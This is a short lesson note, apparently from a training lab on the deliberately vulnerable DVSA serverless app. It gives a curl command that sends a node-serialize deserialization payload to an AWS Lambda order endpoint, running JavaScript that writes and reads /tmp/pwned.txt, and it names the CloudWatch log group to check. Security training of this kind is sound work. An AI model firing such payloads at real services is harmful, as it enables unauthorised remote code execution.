# Lesson 01 Commands

```bash
export API="https://olw47gvbv9.execute-api.us-east-1.amazonaws.com/Stage/order"

curl -s -X POST "$API" \
  -H "Content-Type: application/json" \
  --data-raw '{"action":"_$$ND_FUNC$$_function(){ var fs = require(\"fs\"); fs.writeFileSync(\"/tmp/pwned.txt\", \"You are reading the contents of my hacked file!\"); var fileData = fs.readFileSync(\"/tmp/pwned.txt\", \"utf-8\"); console.error(\"FILE READ SUCCESS: \" + fileData); }()","cart-id":""}'
```

CloudWatch log group:

```text
/aws/lambda/DVSA-ORDER-MANAGER
```
